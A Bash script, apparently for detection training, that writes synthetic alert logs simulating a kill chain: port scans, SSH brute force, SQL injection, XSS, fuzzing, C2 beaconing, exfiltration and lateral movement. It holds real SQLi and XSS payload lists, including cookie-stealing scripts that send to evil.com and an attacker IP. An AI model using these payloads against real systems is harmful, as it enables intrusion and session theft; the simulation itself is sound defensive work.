#!/bin/bash
# =============================================================================
# KILL CHAIN SIMULATOR V6 — Realistic Attack Traffic Generator
# =============================================================================
LOG_FILE="raw_traffic.log"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

DELAY="${1:-0.005}"

echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║       KILL CHAIN SIMULATOR V6 — Full Realistic       ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}[*] Target log : $LOG_FILE | Delay : ${DELAY}s${NC}\n"

> "$LOG_FILE"

# ── Helpers ───────────────────────────────────────────────────────────────────
generate_log() {
    local src_ip="$1" type="$2" payload="$3"
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ALERT: SRC=$src_ip TYPE=$type PAYLOAD='$payload'" >> "$LOG_FILE"
}
generate_legit() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] INFO: SRC=$1 DPT=$2 PROTO=$3 MESSAGE='$4'" >> "$LOG_FILE"
}
pick() { local arr=($@); echo "${arr[$((RANDOM % ${#arr[@]}))]}"; }
rand_between() { echo $(( RANDOM % ($2 - $1 + 1) + $1 )); }

# ─────────────────────────────────────────────────────────────────────────────
# ÉTAPE 1 — Trafic légitime de fond (varié : HTTP, DNS, SMTP, DB...)
# ─────────────────────────────────────────────────────────────────────────────
echo -e "${GREEN}[+] Étape 1 : Trafic légitime varié (500 paquets multi-protocoles)...${NC}"

LEGIT_PORTS=(443 80 53 25 587 3306 5432 8080 993 389)
LEGIT_MSGS=("TLS handshake completed" "DNS query resolved" "SMTP relay accepted"
"DB connection pooled" "Keep-alive ACK" "Session resumed" "Established connection")

for i in {1..500}; do
    ip="192.168.1.$((RANDOM % 250 + 1))"
    dpt="${LEGIT_PORTS[$((RANDOM % ${#LEGIT_PORTS[@]}))]}"
    msg="${LEGIT_MSGS[$((RANDOM % ${#LEGIT_MSGS[@]}))]}"
    generate_legit "$ip" "$dpt" "TCP" "$msg"
    sleep "$DELAY"
    done
    
    # ─────────────────────────────────────────────────────────────────────────────
    # ÉTAPE 2 — Port Scan multi-probe (SYN + ACK + XMAS + UDP + OS fingerprint)
    # ─────────────────────────────────────────────────────────────────────────────
    echo -e "${RED}[!] Étape 2 : Port Scan avancé (multi-probe, ports randomisés)...${NC}"
    TARGET_IP="185.220.101.5"
    
    # Top ports ciblés par Nmap --top-ports (pas juste le 80)
    SCAN_PORTS=(21 22 23 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5900 8080 8443 27017 9200)
    SCAN_TYPES=("SYN_FLOOD_STEALTH_ATTACK" "ACK_PROBE" "XMAS_SCAN" "NULL_SCAN" "UDP_PROBE" "FIN_SCAN")
    OS_FINGERPRINTS=("TTL=64 WindowSize=5840 DF=1" "TTL=128 WindowSize=65535 DF=0" "TTL=255 WindowSize=4096 DF=1")
    
    for i in {1..600}; do
        dpt="${SCAN_PORTS[$((RANDOM % ${#SCAN_PORTS[@]}))]}"
        stype="${SCAN_TYPES[$((RANDOM % ${#SCAN_TYPES[@]}))]}"
        osf="${OS_FINGERPRINTS[$((RANDOM % ${#OS_FINGERPRINTS[@]}))]}"
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] ALERT: SRC=$TARGET_IP DPT=$dpt PROTO=TCP TYPE=PORT_SCAN PAYLOAD='$stype SEQ=$((RANDOM%9999)) $osf'" >> "$LOG_FILE"
        sleep "$DELAY"
        done
        
        echo -e "${RED}    └─ Phase SYN Flood volumétrique (900 paquets concentrés port 80)...${NC}"
        for i in {1..900}; do
            echo "[$(date +'%Y-%m-%d %H:%M:%S')] ALERT: SRC=$TARGET_IP DPT=80 PROTO=TCP TYPE=PORT_SCAN PAYLOAD='SYN_FLOOD_STEALTH_ATTACK SPORT=$((RANDOM%60000+1024))'" >> "$LOG_FILE"
            sleep "$DELAY"
            done
            
            # ─────────────────────────────────────────────────────────────────────────────
            # ÉTAPE 3 — SSH Brute Force avec rotation de wordlist réelle
            # ─────────────────────────────────────────────────────────────────────────────
            echo -e "${RED}[!] Étape 3 : SSH Brute Force (wordlist réelle, rotation user+pass)...${NC}"
            ATTACKER_IP="45.122.33.10"
            
            SSH_USERS=(root admin administrator ubuntu debian pi oracle guest test user
            deploy www-data mysql postgres ftpuser backup support vagrant
            ec2-user hadoop git jenkins nagios zabbix tomcat wildfly)
            
            SSH_PASS=(123456 password admin root 12345678 qwerty abc123 monkey letmein
            dragon master hello shadow sunshine princess welcome charlie
            password1 root123 admin123 toor P@ssw0rd "Password123!" changeme
            iloveyou 1234 test pass 111111 12345 654321 superman batman)
            
            for i in {1..800}; do
                user="${SSH_USERS[$((RANDOM % ${#SSH_USERS[@]}))]}"
                pass="${SSH_PASS[$((RANDOM % ${#SSH_PASS[@]}))]}"
                sport="$((RANDOM % 60000 + 1024))"
                echo "[$(date +'%Y-%m-%d %H:%M:%S')] FATAL: SRC=$ATTACKER_IP DPT=22 PROTO=TCP TYPE=SSH_BRUTE MESSAGE='Failed password for $user from $ATTACKER_IP port $sport ssh2' CREDENTIALS='$user:$pass'" >> "$LOG_FILE"
                sleep "$DELAY"
                done
                
                # ─────────────────────────────────────────────────────────────────────────────
                # ÉTAPE 4 — SQLi multi-technique + XSS DOM/Reflected/WAF-bypass
                # ─────────────────────────────────────────────────────────────────────────────
                echo -e "${RED}[!] Étape 4 : SQLi multi-technique + XSS avec bypass WAF...${NC}"
                WEB_ATTACKER="198.51.100.77"
                
                SQLI_PAYLOADS=(
                    "' OR '1'='1"                                                        
                    "1' AND SLEEP(5)--"                                                  
                    "' UNION SELECT NULL,NULL,NULL--"                                     
                "' UNION SELECT username,password,NULL FROM users--"
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"                       
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"                     
                "'; EXEC xp_cmdshell('whoami')--"                                   
                "1 AND 1=2 UNION SELECT 1,table_name,3 FROM information_schema.tables--"
                "admin'--"                                                          
                "' OR 1=1 LIMIT 1 OFFSET 0--"                                       
                "1; DROP TABLE users--"                                              
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--" 
                )
                
                SQLI_PARAMS=(id user_id page cat item order_id ref search product_id session_id)
                SQLI_ENDPOINTS=(/index.php /product.php /search.php /login.php /api/user /shop/item.php)
                
                for i in {1..150}; do
                    payload="${SQLI_PAYLOADS[$((RANDOM % ${#SQLI_PAYLOADS[@]}))]}"
                    param="${SQLI_PARAMS[$((RANDOM % ${#SQLI_PARAMS[@]}))]}"
                    endpoint="${SQLI_ENDPOINTS[$((RANDOM % ${#SQLI_ENDPOINTS[@]}))]}"
                    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ALERT: SRC=$WEB_ATTACKER DPT=443 PROTO=TCP TYPE=SQL_INJECTION PAYLOAD='GET $endpoint?$param=$payload HTTP/1.1'" >> "$LOG_FILE"
                    sleep "$DELAY"
                    done
                    
                    XSS_PAYLOADS=(
                        "<script>alert(document.cookie)</script>"                           
                    "<img src=x onerror=alert('XSS')>"                                  
                    "<svg onload=alert(1)>"                                              
                    "<body onload=alert('XSS')>"
                    "javascript:alert('XSS')"                                           
                    "\"><script>document.location='http://evil.com/?c='+document.cookie</script>"  
                    "<script>fetch('http://198.51.100.99/steal?c='+document.cookie)</script>"     
                    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"                              
                    "<scRipt>alert('WAF bypass case')</scRipt>"                         
                    "<input autofocus onfocus=alert(1)>"                              
                    "'-alert(1)-'"                                                      
                    "<details open ontoggle=alert(1)>"                                
                    )
                    
                    XSS_PARAMS=(q search name comment redirect msg input keyword)
                    XSS_ENDPOINTS=(/search /comment /profile /feedback /redirect /forum/post)
                    
                    for i in {1..150}; do
                        payload="${XSS_PAYLOADS[$((RANDOM % ${#XSS_PAYLOADS[@]}))]}"
                        param="${XSS_PARAMS[$((RANDOM % ${#XSS_PARAMS[@]}))]}"
                        endpoint="${XSS_ENDPOINTS[$((RANDOM % ${#XSS_ENDPOINTS[@]}))]}"
                        echo "[$(date +'%Y-%m-%d %H:%M:%S')] ALERT: SRC=$WEB_ATTACKER DPT=443 PROTO=TCP TYPE=XSS_ATTACK PAYLOAD='GET $endpoint?$param=$payload HTTP/1.1'" >> "$LOG_FILE"
                        sleep "$DELAY"
                        done
                        
                        # ─────────────────────────────────────────────────────────────────────────────
                        # ÉTAPE 5 — Web Directory Fuzzing (wordlist SecLists réelle)
                        # ─────────────────────────────────────────────────────────────────────────────
                        echo -e "${RED}[!] Étape 5 : Web Fuzzing (SecLists wordlist, 40 chemins réels)...${NC}"
                        WEB_SCANNER="104.28.10.50"
                        
                        declare -A FUZZ_PATHS_STATUS
                        # Chemins qui retournent 200 (fichiers sensibles réels)
                        SENSITIVE_PATHS=(".env" ".git/config" "wp-config.php" "backup.zip" "db_backup.sql" "config.php" "error.log" "api/secrets")
                        # Chemins 404 (énumération normale)
                        ENUM_PATHS=(".htaccess" ".htpasswd" "admin/" "admin/dashboard" "wp-admin/" "wp-login.php"
                        "phpinfo.php" "info.php" "test.php" "debug.php" "server-status"
                        "api/v1/users" "api/v1/admin" "logs/" "log/" "access.log"
                        "uploads/" "files/" "tmp/" "phpmyadmin/" "adminer.php"
                        "swagger.json" "openapi.json" "graphql" "console" "manager/"
                        ".well-known/security.txt" "backup.tar.gz" "configuration.php")
                        
                        for path in "${ENUM_PATHS[@]}"; do
                            generate_log "$WEB_SCANNER" "WEB_ENUMERATION" "GET /$path HTTP/1.1 - 404 Not Found UA='gobuster/3.6'"
                            sleep 0.02
                            done
                            
                            for path in "${SENSITIVE_PATHS[@]}"; do
                                generate_log "$WEB_SCANNER" "SENSITIVE_FILE_ACCESS" "GET /$path HTTP/1.1 - 200 OK UA='gobuster/3.6'"
                                echo -e "${RED}      ⚠  FICHIER SENSIBLE TROUVÉ : /$path${NC}"
                                sleep 0.02
                                done
                                
                                # ─────────────────────────────────────────────────────────────────────────────
                                # ÉTAPE 6 — C2 Beaconing avec jitter + rotation d'URIs + User-Agent spoofing
                                # ─────────────────────────────────────────────────────────────────────────────
                                echo -e "${RED}[!] Étape 6 : C2 Beaconing (jitter 30%, URI rotation, UA spoofing)...${NC}"
                                INFECTED_HOST="192.168.1.105"
                                C2_SERVER="198.51.100.99"
                                
                                C2_URIS=("/api/v1/update" "/cdn-cgi/l/chk_captcha" "/pixel.gif" "/api/telemetry"
                                "/assets/main.js" "/health" "/submit" "/metrics" "/api/v2/sync" "/t.gif")
                                C2_UAS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
                                "Microsoft BITS/7.8" "WinHTTP/1.1" "python-requests/2.28.0"
                                "curl/7.68.0" "Windows-Update-Agent/10.0")
                                
                                for i in {1..15}; do
                                    uri="${C2_URIS[$((RANDOM % ${#C2_URIS[@]}))]}"
                                    ua="${C2_UAS[$((RANDOM % ${#C2_UAS[@]}))]}"
                                    size="$((RANDOM % 400 + 80))"
                                    generate_log "$INFECTED_HOST" "C2_BEACON" \
                                    "Outbound HTTPS POST to $C2_SERVER$uri Size=${size}B UA='$ua' Encrypted=AES256"
                                    jitter=$(rand_between 3 7)
                                    sleep "$jitter"
                                    done
                                    
                                    # ─────────────────────────────────────────────────────────────────────────────
                                    # ÉTAPE 7 — Exfiltration multi-canal (SCP + DNS Tunneling + Cloud HTTPS)
                                    #
                                    # Pourquoi c'est plus réaliste :
                                    #   - Canal 1 SCP : classique, gros volume, facile à détecter mais courant.
                                    #   - Canal 2 DNS Tunneling (dnscat2) : encode les données dans des sous-domaines
                                    #     DNS. Très furtif car DNS/UDP port 53 est toujours autorisé en sortie.
                                    #     Les données ressemblent à des requêtes DNS normales.
                                    #   - Canal 3 Cloud HTTPS : upload vers S3/Dropbox/transfer.sh.
                                    #     Quasiment impossible à bloquer sans casser les services légitimes.
                                    #     C'est la technique préférée des APT modernes.
                                    # ─────────────────────────────────────────────────────────────────────────────
                                    echo -e "${RED}[!] Étape 7 : Exfiltration multi-canal (SCP + DNS Tunnel + Cloud)...${NC}"
                                    EXFIL_SRC="192.168.1.10"
                                    
                                    # Canal 1 : SCP (gros transfert direct)
                                    generate_log "$EXFIL_SRC" "DATA_EXFILTRATION" \
                                    "Outbound SCP to 203.0.113.1:/tmp/dump.tar.gz Size=5.4GB Duration=142s Bytes=5798205850"
                                    sleep 0.1
                                    
                                    # Canal 2 : DNS Tunneling — données encodées en hex dans des sous-domaines
                                    for i in $(seq 1 20); do
                                        chunk=$(printf '%016x' $((RANDOM * RANDOM)))  # Simule des données hex encodées
                                        generate_log "$EXFIL_SRC" "DATA_EXFILTRATION" \
                                        "DNS TXT query ${chunk}.c2.attacker-domain.ru DPT=53 PROTO=UDP chunk=$i/20 tool=dnscat2"
                                        sleep 0.05
                                        done
                                        
                                        # Canal 3 : Upload vers services cloud légitimes
                                        for target in "s3.amazonaws.com/private-bucket-xf91" "api.dropbox.com/2/files/upload" "transfer.sh/upload" "paste.ee/api"; do
                                            size="$((RANDOM % 900 + 100))MB"
                                            generate_log "$EXFIL_SRC" "DATA_EXFILTRATION" \
                                            "Outbound HTTPS PUT $target Size=$size DPT=443 (cloud exfil, mimics legit traffic)"
                                            sleep 0.1
                                            done
                                            
                                            # ─────────────────────────────────────────────────────────────────────────────
                                            # ÉTAPE 8 — Mouvement latéral (SMB + WMI + RDP, ordre randomisé)
                                            #
                                            # Pourquoi c'est plus réaliste :
                                            #   - Un vrai attaquant ne scanne pas 192.168.1.100, 101, 102... en ordre.
                                            #     Il randomise pour éviter les détections séquentielles.
                                            #   - SMB/445 (Pass-the-Hash) : réutilise le hash NTLM sans connaître le mdp.
                                            #   - WMI/135 (WMIExec) : exécution de commandes à distance via Windows
                                            #     Management Instrumentation — souvent ignoré par les AV car c'est
                                            #     un outil Windows natif ("Living off the Land").
                                            #   - RDP/3389 : accès graphique — l'attaquant voit le bureau de la victime.
                                            # ─────────────────────────────────────────────────────────────────────────────
                                            echo -e "${RED}[!] Étape 8 : Mouvement Latéral (SMB Pass-the-Hash + WMI + RDP)...${NC}"
                                            COMPROMISED_IP="192.168.1.42"
                                            
                                            # IPs cibles dans un ordre non séquentiel (scan de sous-réseau + ciblage sélectif)
                                            TARGETS=(147 132 115 190 163 101 182 158 170 195 111 122 133 144 155 166 177 188 200 100 199)
                                            NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
                                            
                                            # SMB Pass-the-Hash sur les 10 premières cibles
                                            for target in "${TARGETS[@]:0:10}"; do
                                                generate_log "$COMPROMISED_IP" "LATERAL_MOVEMENT" \
                                                "SMB Auth failure on 192.168.1.$target:445 NTLM='$NTLM_HASH' technique=Pass-the-Hash tool=CrackMapExec"
                                                sleep 0.05
                                                done
                                                
                                                # WMI Remote Exec sur 5 cibles (Living-off-the-Land)
                                                for target in "${TARGETS[@]:10:5}"; do
                                                    cmd=$(pick "whoami" "ipconfig /all" "net user /domain" "systeminfo" "tasklist")
                                                    generate_log "$COMPROMISED_IP" "LATERAL_MOVEMENT" \
                                                    "WMI exec on 192.168.1.$target:135 CMD='cmd.exe /c $cmd' technique=WMIExec tool=impacket"
                                                    sleep 0.08
                                                    done
                                                    
                                                    # RDP Brute-force sur les dernières cibles
                                                    RDP_USERS=(administrator admin user backup_admin sysadmin)
                                                    for target in "${TARGETS[@]:15:6}"; do
                                                        user="${RDP_USERS[$((RANDOM % ${#RDP_USERS[@]}))]}"
                                                        generate_log "$COMPROMISED_IP" "LATERAL_MOVEMENT" \
                                                        "RDP auth failure on 192.168.1.$target:3389 USER='$user' technique=RDP-Brute tool=hydra"
                                                        sleep 0.06
                                                        done
                                                        
                                                        # ─────────────────────────────────────────────────────────────────────────────
                                                        # RÉSUMÉ
                                                        # ─────────────────────────────────────────────────────────────────────────────
                                                        total=$(wc -l < "$LOG_FILE")
                                                        echo -e "\n${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
                                                        echo -e "${YELLOW}║           SIMULATION V6 TERMINÉE AVEC SUCCÈS         ║${NC}"
                                                        echo -e "${YELLOW}╠══════════════════════════════════════════════════════╣${NC}"
                                                        echo -e "${YELLOW}║  Étape 1 : Trafic légitime varié         (500 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 2 : Port scan multi-probe + SYN   (1500 pkt)  ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 3 : SSH brute (wordlist réelle)   (800 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 4 : SQLi 5 techniques + XSS WAF   (300 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 5 : Fuzzing SecLists wordlist      (~40 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 6 : C2 jitter + URI/UA rotation   (15 bea.)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 7 : Exfil SCP + DNS + Cloud        (~25 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}║  Étape 8 : SMB + WMI + RDP randomisé     (~21 pkt)   ║${NC}"
                                                        echo -e "${YELLOW}╠══════════════════════════════════════════════════════╣${NC}"
                                                        printf  "${YELLOW}║  %-50s  ║${NC}\n" "Total lignes injectées : $total"
                                                        echo -e "${YELLOW}╚══════════════════════════════════════════════════════╝${NC}"
